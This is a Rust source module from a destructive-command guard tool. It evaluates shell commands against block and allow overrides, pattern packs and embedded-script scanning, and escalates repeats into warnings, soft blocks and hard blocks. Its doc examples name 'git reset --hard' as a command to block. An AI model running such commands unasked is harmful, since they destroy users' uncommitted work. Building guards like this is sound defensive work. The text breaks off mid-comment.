//! Shared command evaluator for hook mode and CLI.
//!
//! This module provides a unified evaluation entry point that can be used by both
//! the hook mode (stdin JSON) and CLI (`dcg test`) to ensure consistent behavior.
//!
//! # Architecture
//!
//! The evaluator performs the following steps in order:
//!
//! 1. **Config block overrides** - Explicit block patterns deny before allow patterns
//! 2. **Config allow overrides** - Explicit allow patterns permit non-blocked commands
//! 3. **Heredoc/inline scripts** - Extract + AST-scan embedded code (fail-open)
//! 4. **Quick rejection** - Skip pack evaluation if no relevant keywords present
//! 5. **Context sanitization** - Mask known-safe string arguments (reduce false positives)
//! 6. **Command normalization** - Strip absolute paths from git/rm binaries
//! 7. **Pack registry** - Check enabled packs (safe patterns first, then destructive)
//!
//! # Example
//!
//! ```ignore
//! use destructive_command_guard::config::Config;
//! use destructive_command_guard::evaluator::{evaluate_command, EvaluationDecision};
//!
//! let config = Config::load();
//! let compiled_overrides = config.overrides.compile();
//! let enabled_keywords = vec!["git", "rm", "docker"];
//! let allowlists = destructive_command_guard::load_default_allowlists();
//! let result = evaluate_command(
//!     "git reset --hard",
//!     &config,
//!     &enabled_keywords,
//!     &compiled_overrides,
//!     &allowlists,
//! );
//!
//! match result.decision {
//!     EvaluationDecision::Allow => println!("Command allowed"),
//!     EvaluationDecision::Deny => {
//!         if let Some(info) = &result.pattern_info {
//!             println!("Blocked by {}: {}", info.pack_id.as_deref().unwrap_or("legacy"), info.reason);
//!         }
//!     }
//! }
//! ```

use crate::allowlist::{AllowlistLayer, LayeredAllowlist};
use crate::ast_matcher::DEFAULT_MATCHER;
use crate::config::Config;
use crate::context::sanitize_for_pattern_matching;
use crate::heredoc::{
    ExtractionResult, SkipReason, TriggerResult, check_triggers, extract_content,
};
use crate::normalize::{PATH_NORMALIZER, QUOTED_PATH_NORMALIZER, strip_wrapper_prefixes};
use crate::packs::{
    PatternSuggestion, REGISTRY, pack_aware_quick_reject, pack_aware_quick_reject_with_normalized,
};
use crate::pending_exceptions::AllowOnceStore;
use crate::perf::Deadline;
use chrono::Utc;
use regex::RegexSet;
use std::borrow::Cow;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

/// Convert `ast_matcher::Severity` to `packs::Severity`.
///
/// Both enums have identical variants; this bridges the two type systems.
const fn ast_severity_to_pack_severity(s: crate::ast_matcher::Severity) -> crate::packs::Severity {
    match s {
        crate::ast_matcher::Severity::Critical => crate::packs::Severity::Critical,
        crate::ast_matcher::Severity::High => crate::packs::Severity::High,
        crate::ast_matcher::Severity::Medium => crate::packs::Severity::Medium,
        crate::ast_matcher::Severity::Low => crate::packs::Severity::Low,
    }
}

/// Maximum length for match text preview (in characters, not bytes).
const MAX_PREVIEW_CHARS: usize = 80;

/// Extract a UTF-8 safe preview of the matched text from a command.
///
/// The preview is truncated to `MAX_PREVIEW_CHARS` characters if too long,
/// with "..." appended to indicate truncation.
///
/// If the byte offsets fall in the middle of a multi-byte UTF-8 character,
/// we snap to the nearest valid character boundary to avoid panics.
fn extract_match_preview(command: &str, span: &MatchSpan) -> String {
    // Ensure byte offsets are within bounds
    let start = span.start.min(command.len());
    let end = span.end.min(command.len());

    if start >= end {
        return String::new();
    }

    // Snap to valid UTF-8 character boundaries to avoid panics.
    // If start is not at a boundary, move forward to the next boundary.
    // If end is not at a boundary, move backward to the previous boundary.
    let safe_start = if command.is_char_boundary(start) {
        start
    } else {
        // Find the next character boundary
        (start + 1..=command.len())
            .find(|&i| command.is_char_boundary(i))
            .unwrap_or(command.len())
    };

    let safe_end = if command.is_char_boundary(end) {
        end
    } else {
        // Find the previous character boundary
        (0..end)
            .rfind(|&i| command.is_char_boundary(i))
            .unwrap_or(0)
    };

    if safe_start >= safe_end {
        return String::new();
    }

    // Now safe to slice (boundaries are guaranteed valid)
    let matched = &command[safe_start..safe_end];

    // Truncate to MAX_PREVIEW_CHARS characters (UTF-8 safe)
    truncate_preview(matched, MAX_PREVIEW_CHARS)
}

/// Truncate a string to at most `max_chars` characters, UTF-8 safe.
///
/// If truncation occurs, appends "..." to indicate more content exists.
fn truncate_preview(text: &str, max_chars: usize) -> String {
    let char_count = text.chars().count();
    if char_count <= max_chars {
        text.to_string()
    } else {
        // Leave room for "..."
        let truncate_at = max_chars.saturating_sub(3);
        let truncated: String = text.chars().take(truncate_at).collect();
        format!("{truncated}...")
    }
}

// ============================================================================
// UTF-8 Safe Windowing for Long Commands
// ============================================================================

/// Default maximum width for command display (characters, not bytes).
pub const DEFAULT_WINDOW_WIDTH: usize = 120;

/// Result of windowing a command for display.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WindowedCommand {
    /// The windowed command string (with "..." if truncated).
    pub display: String,
    /// The span adjusted for the windowed string (for caret alignment).
    /// None if the original span couldn't be mapped to the window.
    pub adjusted_span: Option<WindowedSpan>,
}

/// Span within the windowed command for caret alignment.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct WindowedSpan {
    /// Start character offset in the windowed display string.
    pub start: usize,
    /// End character offset in the windowed display string.
    pub end: usize,
}

/// Snap a byte offset to the nearest valid UTF-8 character boundary.
///
/// If `prefer_forward` is true, snaps forward; otherwise snaps backward.
fn snap_to_char_boundary(s: &str, offset: usize, prefer_forward: bool) -> usize {
    if offset >= s.len() {
        return s.len();
    }
    if s.is_char_boundary(offset) {
        return offset;
    }
    if prefer_forward {
        (offset + 1..=s.len())
            .find(|&i| s.is_char_boundary(i))
            .unwrap_or(s.len())
    } else {
        (0..offset).rfind(|&i| s.is_char_boundary(i)).unwrap_or(0)
    }
}

/// Create a windowed view of a command centered around a match span.
///
/// This function:
/// - Returns the full command if it fits within `max_width` characters
/// - Otherwise, centers the window around the match span
/// - Adds "..." prefix when left-truncating
/// - Adds "..." suffix when right-truncating
/// - Ensures all slicing respects UTF-8 character boundaries
///
/// # Arguments
///
/// * `command` - The full command string
/// * `span` - The match span (byte offsets) to center around
/// * `max_width` - Maximum display width in characters (not bytes)
///
/// # Returns
///
/// A `WindowedCommand` with the display string and adjusted span for caret alignment.
///
/// # Example
///
/// ```
/// use destructive_command_guard::evaluator::{window_command, MatchSpan};
///
/// let cmd = "very long prefix ... git reset --hard ... more suffix text";
/// let span = MatchSpan { start: 24, end: 40 }; // "git reset --hard"
/// let result = window_command(cmd, &span, 40);
///
/// // Result shows match in context with ellipsis
/// assert!(result.display.contains("git reset --hard"));
/// assert!(result.adjusted_span.is_some());
/// ```
#[must_use]
pub fn window_command(command: &str, span: &MatchSpan, max_width: usize) -> WindowedCommand {
    let char_count = command.chars().count();

    // If command fits, return as-is with byte-to-char span conversion
    if char_count <= max_width {
        let adjusted_span = byte_span_to_char_span(command, span);
        return WindowedCommand {
            display: command.to_string(),
            adjusted_span,
        };
    }

    // Snap span to character boundaries
    let safe_start = snap_to_char_boundary(command, span.start, true);
    let safe_end = snap_to_char_boundary(command, span.end, false);

    if safe_start >= safe_end || safe_start >= command.len() {
        // Invalid span - return truncated command without span
        let truncated: String = command.chars().take(max_width.saturating_sub(3)).collect();
        return WindowedCommand {
            display: format!("{truncated}..."),
            adjusted_span: None,
        };
    }

    // Convert byte offsets to character positions for windowing logic
    let match_char_start = command[..safe_start].chars().count();
    let match_char_end = command[..safe_end].chars().count();
    let match_char_len = match_char_end.saturating_sub(match_char_start);

    // Calculate window bounds in character positions
    // Reserve space for "..." on each side (3 chars each)
    let ellipsis_len = 3;
    let available_width = max_width.saturating_sub(ellipsis_len * 2);

    // If match itself is larger than window, show what we can
    if match_char_len >= available_width {
        let visible_match: String = command[safe_start..safe_end]
            .chars()
            .take(available_width)
            .collect();
        return WindowedCommand {
            display: format!("...{visible_match}..."),
            adjusted_span: Some(WindowedSpan {
                start: ellipsis_len,
                end: ellipsis_len + visible_match.chars().count(),
            }),
        };
    }

    // Calculate context to show around the match
    let context_budget = available_width.saturating_sub(match_char_len);
    let left_context = context_budget / 2;
    let right_context = context_budget - left_context;

    // Determine window start/end in character positions
    let window_char_start = match_char_start.saturating_sub(left_context);
    let window_char_end = (match_char_end + right_context).min(char_count);

    // Check if we need ellipsis on each side
    let needs_left_ellipsis = window_char_start > 0;
    let needs_right_ellipsis = window_char_end < char_count;

    // Build the windowed string
    let mut result = String::new();
    let adjusted_start = if needs_left_ellipsis {
        result.push_str("...");
        ellipsis_len
    } else {
        0
    };

    // Extract the windowed portion
    let windowed: String = command
        .chars()
        .skip(window_char_start)
        .take(window_char_end - window_char_start)
        .collect();

    // Calculate adjusted span within the windowed result
    let span_start_in_window = match_char_start - window_char_start + adjusted_start;
    let span_end_in_window = span_start_in_window + match_char_len;

    result.push_str(&windowed);

    if needs_right_ellipsis {
        result.push_str("...");
    }

    WindowedCommand {
        display: result,
        adjusted_span: Some(WindowedSpan {
            start: span_start_in_window,
            end: span_end_in_window,
        }),
    }
}

/// Convert a byte span to a character span for caret alignment.
fn byte_span_to_char_span(command: &str, span: &MatchSpan) -> Option<WindowedSpan> {
    let safe_start = snap_to_char_boundary(command, span.start, true);
    let safe_end = snap_to_char_boundary(command, span.end, false);

    if safe_start >= safe_end || safe_start >= command.len() {
        return None;
    }

    let char_start = command[..safe_start].chars().count();
    let char_end = command[..safe_end].chars().count();

    Some(WindowedSpan {
        start: char_start,
        end: char_end,
    })
}

fn compute_normalized_offset(command_for_match: &str, normalized: &str) -> Option<usize> {
    if normalized == command_for_match {
        return Some(0);
    }

    if let Some(pos) = command_for_match.find(normalized) {
        return Some(pos);
    }

    let stripped = strip_wrapper_prefixes(command_for_match);
    let stripped_cmd = stripped.normalized.as_ref();
    let base_offset = command_for_match.find(stripped_cmd)?;

    if stripped_cmd == normalized {
        return Some(base_offset);
    }

    if let Some(pos) = stripped_cmd.find(normalized) {
        return Some(base_offset + pos);
    }

    if let Ok(Some(caps)) = QUOTED_PATH_NORMALIZER.captures(stripped_cmd) {
        if let Some(m) = caps.get(1) {
            return Some(base_offset + m.start());
        }
    }

    if let Ok(Some(caps)) = PATH_NORMALIZER.captures(stripped_cmd) {
        if let Some(m) = caps.get(1) {
            return Some(base_offset + m.start());
        }
    }

    None
}

fn map_span_with_offset(
    span: MatchSpan,
    offset: Option<usize>,
    original_len: usize,
) -> Option<MatchSpan> {
    let offset = offset?;
    let start = span.start.saturating_add(offset);
    let end = span.end.saturating_add(offset);
    if start <= end && end <= original_len {
        Some(MatchSpan { start, end })
    } else {
        None
    }
}

/// The decision made by the evaluator.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EvaluationDecision {
    /// Command is allowed to execute.
    Allow,
    /// Command is blocked from executing.
    Deny,
}

/// Byte span of a match within the evaluated command string.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct MatchSpan {
    /// Start byte offset (inclusive).
    pub start: usize,
    /// End byte offset (exclusive).
    pub end: usize,
}

/// Information about the pattern that matched (for denials).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PatternMatch {
    /// The pack that blocked the command (None for legacy patterns or config overrides).
    pub pack_id: Option<String>,
    /// The name of the pattern that matched (if available).
    pub pattern_name: Option<String>,
    /// Severity level of the matched pattern.
    pub severity: Option<crate::packs::Severity>,
    /// Human-readable reason for blocking.
    pub reason: String,
    /// Source of the match (for debugging/explain mode).
    pub source: MatchSource,
    /// Byte span of the first match within the command (for explain highlighting).
    pub matched_span: Option<MatchSpan>,
    /// Preview of the matched text (UTF-8 safe, truncated if too long).
    pub matched_text_preview: Option<String>,
    /// Detailed explanation of why this pattern is dangerous.
    /// More verbose than `reason`, intended for explain/verbose output modes.
    /// Falls back to `reason` when not provided.
    pub explanation: Option<String>,
    /// Safer alternative commands suggested for this pattern.
    pub suggestions: &'static [PatternSuggestion],
}

/// Information about an allowlist override (DENY -> ALLOW).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AllowlistOverride {
    /// Which allowlist layer matched (project/user/system).
    pub layer: AllowlistLayer,
    /// The allowlist entry reason (why this override exists).
    pub reason: String,
    /// The match that would have denied the command.
    pub matched: PatternMatch,
}

/// Source of a pattern match (for debugging and explain mode).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MatchSource {
    /// Matched a config override (allow or block).
    ConfigOverride,
    /// Matched a legacy pattern in main.rs.
    LegacyPattern,
    /// Matched a pattern from a pack.
    Pack,
    /// Matched an AST/heuristic pattern in an embedded script (heredoc / inline code).
    HeredocAst,
}

/// Git branch context for the evaluation.
///
/// Present when git branch awareness is enabled and we're in a git repository.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BranchContext {
    /// The current branch name (None if detached HEAD or not in git repo).
    pub branch_name: Option<String>,
    /// Whether this is a protected branch.
    pub is_protected: bool,
    /// Whether this is a relaxed branch.
    pub is_relaxed: bool,
    /// The effective strictness level for this branch.
    pub strictness: crate::config::StrictnessLevel,
    /// Whether the decision was affected by branch awareness.
    /// True if the command would have been blocked but was allowed due to
    /// relaxed strictness on a non-protected branch.
    pub affected_decision: bool,
}

/// Result of evaluating a command.
#[derive(Debug, Clone)]
pub struct EvaluationResult {
    /// The decision (Allow or Deny).
    pub decision: EvaluationDecision,
    /// Pattern match information (present when decision is Deny or Warn).
    pub pattern_info: Option<PatternMatch>,
    /// Allowlist override information (present when decision is Allow due to allowlist).
    pub allowlist_override: Option<AllowlistOverride>,
    /// Effective decision mode (how to handle the decision).
    /// Present when a pattern matched. None means the command is clean (no pattern matched).
    /// - Deny: block command, output warning + JSON deny
    /// - Warn: allow command, output warning only
    /// - Log: allow command, log only (no visible output)
    pub effective_mode: Option<crate::packs::DecisionMode>,
    /// Whether evaluation skipped deeper analysis due to a deadline overrun.
    pub skipped_due_to_budget: bool,
    /// Git branch context (present when branch awareness is enabled).
    pub branch_context: Option<BranchContext>,
    /// Session occurrence snapshot (present when the command matched a pattern).
    /// Tracks how many times this command has been seen in the current process.
    pub session_occurrence: Option<crate::session::OccurrenceSnapshot>,
    /// Graduated response level (present when graduation system is enabled).
    pub graduated_response: Option<GraduatedResponse>,
    /// How a soft block was bypassed (present when bypass occurred).
    pub bypass_method: Option<BypassMethod>,
}

impl EvaluationResult {
    /// Create an "allowed" result.
    #[inline]
    #[must_use]
    pub const fn allowed() -> Self {
        Self {
            decision: EvaluationDecision::Allow,
            pattern_info: None,
            allowlist_override: None,
            effective_mode: None,
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create an "allowed" result due to budget exhaustion (fail-open).
    #[inline]
    #[must_use]
    pub const fn allowed_due_to_budget() -> Self {
        Self {
            decision: EvaluationDecision::Allow,
            pattern_info: None,
            allowlist_override: None,
            effective_mode: None,
            skipped_due_to_budget: true,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from config override.
    #[inline]
    #[must_use]
    pub const fn denied_by_config(reason: String) -> Self {
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: None,
                pattern_name: None,
                severity: None,
                reason,
                source: MatchSource::ConfigOverride,
                matched_span: None,
                matched_text_preview: None,
                explanation: None,
                suggestions: &[],
            }),
            allowlist_override: None,
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from legacy pattern.
    #[inline]
    #[must_use]
    pub fn denied_by_legacy(reason: &str) -> Self {
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: None,
                pattern_name: None,
                severity: None,
                reason: reason.to_string(),
                source: MatchSource::LegacyPattern,
                matched_span: None,
                matched_text_preview: None,
                explanation: None,
                suggestions: &[],
            }),
            allowlist_override: None,
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from legacy pattern with match span.
    #[inline]
    #[must_use]
    pub fn denied_by_legacy_with_span(reason: &str, command: &str, span: MatchSpan) -> Self {
        let preview = extract_match_preview(command, &span);
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: None,
                pattern_name: None,
                severity: None,
                reason: reason.to_string(),
                source: MatchSource::LegacyPattern,
                matched_span: Some(span),
                matched_text_preview: Some(preview),
                explanation: None,
                suggestions: &[],
            }),
            allowlist_override: None,
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from a pack.
    #[inline]
    #[must_use]
    pub fn denied_by_pack(pack_id: &str, reason: &str, explanation: Option<&str>) -> Self {
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: Some(pack_id.to_string()),
                pattern_name: None,
                severity: None,
                reason: reason.to_string(),
                source: MatchSource::Pack,
                matched_span: None,
                matched_text_preview: None,
                explanation: explanation.map(str::to_string),
                suggestions: &[],
            }),
            allowlist_override: None,
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from a pack with match span info.
    #[inline]
    #[must_use]
    pub fn denied_by_pack_with_span(
        pack_id: &str,
        reason: &str,
        explanation: Option<&str>,
        command: &str,
        span: MatchSpan,
    ) -> Self {
        let preview = extract_match_preview(command, &span);
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: Some(pack_id.to_string()),
                pattern_name: None,
                severity: None,
                reason: reason.to_string(),
                source: MatchSource::Pack,
                matched_span: Some(span),
                matched_text_preview: Some(preview),
                explanation: explanation.map(str::to_string),
                suggestions: &[],
            }),
            allowlist_override: None,
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from a pack with pattern name.
    #[inline]
    #[must_use]
    pub fn denied_by_pack_pattern(
        pack_id: &str,
        pattern_name: &str,
        reason: &str,
        explanation: Option<&str>,
        severity: crate::packs::Severity,
        suggestions: &'static [PatternSuggestion],
    ) -> Self {
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: Some(pack_id.to_string()),
                pattern_name: Some(pattern_name.to_string()),
                severity: Some(severity),
                reason: reason.to_string(),
                source: MatchSource::Pack,
                matched_span: None,
                matched_text_preview: None,
                explanation: explanation.map(str::to_string),
                suggestions,
            }),
            allowlist_override: None,
            effective_mode: Some(severity.default_mode()),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create a "denied" result from a pack with pattern name and match span.
    #[inline]
    #[must_use]
    pub fn denied_by_pack_pattern_with_span(
        pack_id: &str,
        pattern_name: &str,
        reason: &str,
        explanation: Option<&str>,
        severity: crate::packs::Severity,
        suggestions: &'static [PatternSuggestion],
        command: &str,
        span: MatchSpan,
    ) -> Self {
        let preview = extract_match_preview(command, &span);
        Self {
            decision: EvaluationDecision::Deny,
            pattern_info: Some(PatternMatch {
                pack_id: Some(pack_id.to_string()),
                pattern_name: Some(pattern_name.to_string()),
                severity: Some(severity),
                reason: reason.to_string(),
                source: MatchSource::Pack,
                matched_span: Some(span),
                matched_text_preview: Some(preview),
                explanation: explanation.map(str::to_string),
                suggestions,
            }),
            allowlist_override: None,
            effective_mode: Some(severity.default_mode()),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Create an "allowed" result due to allowlist override.
    #[must_use]
    pub const fn allowed_by_allowlist(
        matched: PatternMatch,
        layer: AllowlistLayer,
        reason: String,
    ) -> Self {
        Self {
            decision: EvaluationDecision::Allow,
            pattern_info: None,
            allowlist_override: Some(AllowlistOverride {
                layer,
                reason,
                matched,
            }),
            // Allowlist overrides apply to a matched rule (typically deny-by-default).
            effective_mode: Some(crate::packs::DecisionMode::Deny),
            skipped_due_to_budget: false,
            branch_context: None,
            session_occurrence: None,
            graduated_response: None,
            bypass_method: None,
        }
    }

    /// Check if the command was allowed.
    #[inline]
    #[must_use]
    pub fn is_allowed(&self) -> bool {
        self.decision == EvaluationDecision::Allow
    }

    /// Check if the command was denied.
    #[inline]
    #[must_use]
    pub fn is_denied(&self) -> bool {
        self.decision == EvaluationDecision::Deny
    }

    /// Get the reason for denial (if denied).
    #[must_use]
    pub fn reason(&self) -> Option<&str> {
        self.pattern_info.as_ref().map(|p| p.reason.as_str())
    }

    /// Get the session occurrence count for this command, if tracked.
    #[inline]
    #[must_use]
    pub fn session_count(&self) -> Option<u32> {
        self.session_occurrence.as_ref().map(|s| s.session_count)
    }

    /// Get the pack ID that blocked (if denied by a pack).
    #[must_use]
    pub fn pack_id(&self) -> Option<&str> {
        self.pattern_info
            .as_ref()
            .and_then(|p| p.pack_id.as_deref())
    }

    /// Apply graduation logic based on session occurrence data.
    ///
    /// If the result has a session occurrence snapshot and a severity, computes
    /// the graduated response. Does nothing if graduation is disabled or there
    /// is no occurrence data.
    pub fn apply_graduation(&mut self, config: &crate::config::ResponseConfig) {
        self.apply_graduation_with_history_count(None, config);
    }

    /// Same as [`apply_graduation`] but also feeds an optional cross-session
    /// `history_count` (occurrences of this command's `command_hash` blocked
    /// within `config.history_window`) into the graduation computation.
    /// Standard/Lenient mode escalates based on whichever signal — session
    /// or history — is stronger. Pass `None` to keep the previous behavior.
    pub fn apply_graduation_with_history_count(
        &mut self,
        history_count: Option<u32>,
        config: &crate::config::ResponseConfig,
    ) {
        if !config.is_enabled() {
            return;
        }
        let session_count = match self.session_occurrence.as_ref() {
            Some(snap) => snap.session_count,
            None => return,
        };
        let severity = self
            .pattern_info
            .as_ref()
            .and_then(|p| p.severity)
            .unwrap_or(crate::packs::Severity::High);
        self.graduated_response = determine_graduated_response_with_history(
            session_count,
            history_count,
            severity,
            config,
        );
    }

    /// Convenience: query the supplied [`HistoryDb`] for the number of
    /// times this command's `command_hash` was blocked within
    /// `config.history_window`, then apply graduation. On any history
    /// query error, falls back to session-only graduation (fail-open) so
    /// the hot path never errors out.
    pub fn apply_graduation_with_history_db(
        &mut self,
        command: &str,
        history: &crate::history::HistoryDb,
        config: &crate::config::ResponseConfig,
    ) {
        if !config.is_enabled() {
            return;
        }
        let window = config.history_window_duration();
        let history_count = match history.count_command_blocks_in_window(command, window) {
            Ok(n) => Some(n),
            Err(e) => {
                tracing::debug!(error = %e, "history count query failed; falling back to session-only graduation");
                None
            }
        };
        self.apply_graduation_with_history_count(history_count, config);
    }

    /// Record the command in session tracking and apply graduation.
    ///
    /// Convenience method that:
    /// 1. Records the command occurrence via [`crate::session::record_and_snapshot`].
    /// 2. Calls [`apply_graduation`](Self::apply_graduation).
    pub fn record_and_graduate(&mut self, command: &str, config: &crate::config::ResponseConfig) {
        if self.is_denied() {
            let snap = crate::session::record_and_snapshot(command);
            self.session_occurrence = Some(snap);
            self.apply_graduation(config);
        }
    }
}

/// Response level from the graduation system.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GraduatedResponse {
    /// Command seen before but below block threshold.
    Warning { occurrence: u32 },
    /// Session threshold reached; agent should reconsider (bypassable).
    SoftBlock { occurrence: u32 },
    /// Hard block; too many repeated attempts.
    HardBlock { total_occurrences: u32 },
}

impl GraduatedResponse {
    /// Whether this response blocks the command.
    #[must_use]
    pub const fn blocks(&self) -> bool {
        matches!(self, Self::SoftBlock { .. } | Self::HardBlock { .. })
    }

    /// Whether this is an unbypassable hard block.
    #[must_use]
    pub const fn is_hard_block(&self) -> bool {
        matches!(self, Self::HardBlock { .. })
    }

    /// The graduation mode that produced this response.
    #[must_use]
    pub fn decision_mode(&self) -> &'static str {
        match self {
            Self::Warning { .. } => "warning",
            Self::SoftBlock { .. } => "soft_block",
            Self::HardBlock { .. } => "hard_block",
        }
    }

    /// Human-friendly label.
    #[must_use]
    pub fn label(&self) -> String {
        match self {
            Self::Warning { occurrence } => format!("warning (occurrence #{occurrence})"),
            Self::SoftBlock { occurrence } => format!("soft block (occurrence #{occurrence})"),
            Self::HardBlock { total_occurrences } => {
                format!("hard block ({total_occurrences} total occurrences)")
            }
        }
    }
}

/// How a soft block was bypassed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BypassMethod {
    /// The `--force` flag was used.
    Force,
    /// An allow-once exception was granted.
    AllowOnce,
}

impl BypassMethod {
    /// Human-friendly label.
    #[must_use]
    pub const fn label(&self) -> &'static str {
        match self {
            Self::Force => "force",
            Self::AllowOnce => "allow_once",
        }
    }
}

/// Determine the graduated response level from session occurrence count and config.
///
/// Uses the effective graduation mode for the given severity to decide thresholds.
/// Returns `None` when graduation is disabled for this severity.
///
/// # Counter scope (important for hook usage)
///
/// `session_count` is sourced from [`crate::session::record_and_snapshot`],
/// which lives in a process-local static. dcg runs as a fresh process per
/// `Bash` hook invocation, so for hook callers `session_count` is effectively
/// always `1`. Practical implications by mode:
///
/// - `Paranoid` / `WarningOnly`: behave as documented (threshold-free).
/// - `Strict`: every hook invocation is a `SoftBlock`; `HardBlock` requires
///   `session_soft_block` repetitions, which only occur in long-lived callers
///   (`dcg test`, MCP server, repeated CLI evaluations within one process).
/// - `Standard` / `Lenient`: the `Warning`/`SoftBlock` thresholds escalate
///   only inside a single process. Cross-invocation escalation is governed
///   by `history_soft_block` / `history_hard_block` / `history_window` in
///   [`crate::config::ResponseConfig`], but those fields are not yet
///   consulted here — wiring them in requires querying the history DB
///   from the hook hot path and is tracked as future work.
///
/// Until history-backed escalation lands, treat `Standard`/`Lenient` as
/// CLI-/MCP-oriented modes; for shell-hook integrations choose `Paranoid`,
/// `WarningOnly`, or `Strict` depending on how strict a single occurrence
/// should be.
#[must_use]
pub fn determine_graduated_response(
    session_count: u32,
    severity: crate::packs::Severity,
    config: &crate::config::ResponseConfig,
) -> Option<GraduatedResponse> {
    determine_graduated_response_with_history(session_count, None, severity, config)
}

/// History-aware variant of [`determine_graduated_response`].
///
/// Also consults `history_count` (occurrences of this command's
/// `command_hash` blocked within `config.history_window`). When provided,
/// Standard/Lenient mode escalates based on whichever signal is louder:
///
/// - `history_count >= history_hard_block` → `HardBlock`
/// - `history_count >= history_soft_block` → `SoftBlock`
/// - otherwise: existing session-only logic
///
/// Paranoid / WarningOnly / Strict / Disabled are unaffected — they don't
/// have escalation tiers driven by occurrence count.
///
/// Callers without history-DB access pass `None` for `history_count`; the
/// behavior matches the pre-wiring evaluator exactly.
#[must_use]
pub fn determine_graduated_response_with_history(
    session_count: u32,
    history_count: Option<u32>,
    severity: crate::packs::Severity,
    config: &crate::config::ResponseConfig,
) -> Option<GraduatedResponse> {
    use crate::config::GraduationMode;

    if !config.is_enabled() {
        return None;
    }

    let mode = config.effective_mode(severity);

    // For Standard/Lenient, history thresholds can lift the response above
    // what session_count alone would warrant. Compute the history tier first
    // so callers see the strictest applicable response.
    let history_tier = history_count.and_then(|hc| {
        if matches!(mode, GraduationMode::Standard | GraduationMode::Lenient) {
            if hc >= config.history_hard_block {
                Some(GraduatedResponse::HardBlock {
                    total_occurrences: hc,
                })
            } else if hc >= config.history_soft_block {
                Some(GraduatedResponse::SoftBlock { occurrence: hc })
            } else {
                None
            }
        } else {
            None
        }
    });

    let session_tier = match mode {
        GraduationMode::Disabled => None,
        GraduationMode::WarningOnly => Some(GraduatedResponse::Warning {
            occurrence: session_count,
        }),
        GraduationMode::Paranoid => {
            // Paranoid: always hard block on first occurrence.
            Some(GraduatedResponse::HardBlock {
                total_occurrences: session_count,
            })
        }
        GraduationMode::Strict => {
            // Strict: soft_block from the first occurrence, escalate to
            // hard_block once `session_soft_block` is reached. There is no
            // Warning level in Strict — every occurrence below the hard-block
            // threshold is a SoftBlock so the user sees a deliberate gate.
            if session_count >= config.session_soft_block {
                Some(GraduatedResponse::HardBlock {
                    total_occurrences: session_count,
                })
            } else {
                Some(GraduatedResponse::SoftBlock {
                    occurrence: session_count,
                })
            }
        }
        GraduationMode::Standard => {
            if session_count >= config.session_soft_block {
                Some(GraduatedResponse::SoftBlock {
                    occurrence: session_count,
                })
            } else if session_count >= config.session_warning_count {
                Some(GraduatedResponse::Warning {
                    occurrence: session_count,
                })
            } else {
                None
            }
        }
        GraduationMode::Lenient => {
            // Lenient: double the standard thresholds.
            let warn_threshold = config.session_warning_count.saturating_mul(2);
            let soft_threshold = config.session_soft_block.saturating_mul(2);
            if session_count >= soft_threshold {
                Some(GraduatedResponse::SoftBlock {
                    occurrence: session_count,
                })
            } else if session_count >= warn_threshold {
                Some(GraduatedResponse::Warning {
                    occurrence: session_count,
                })
            } else {
                None
            }
        }
    };

    // Pick the strictest applicable response: HardBlock > SoftBlock > Warning.
    match (history_tier, session_tier) {
        (Some(h), Some(s)) => Some(strictest(h, s)),
        (Some(h), None) => Some(h),
        (None, s) => s,
    }
}

fn strictest(a: GraduatedResponse, b: GraduatedResponse) -> GraduatedResponse {
    fn rank(r: &GraduatedResponse) -> u8 {
        match r {
            GraduatedResponse::Warning { .. } => 1,
            GraduatedResponse::SoftBlock { .. } => 2,
            GraduatedResponse::HardBlock { .. } => 3,
        }
    }
    if rank(&a) >= rank(&b) { a } else { b }
}

// =============================================================================
// Detailed Evaluation Result (E1-T3: Expose detailed evaluation in evaluator)
// =============================================================================

/// Detailed evaluation result with timing and diagnostic information.
///
/// This struct wraps [`EvaluationResult`] with additional metadata useful for
/// verbose output, debugging, and the `dcg test` command. It captures timing
/// information and which keywords were checked during evaluation.
///
/// # Example
///
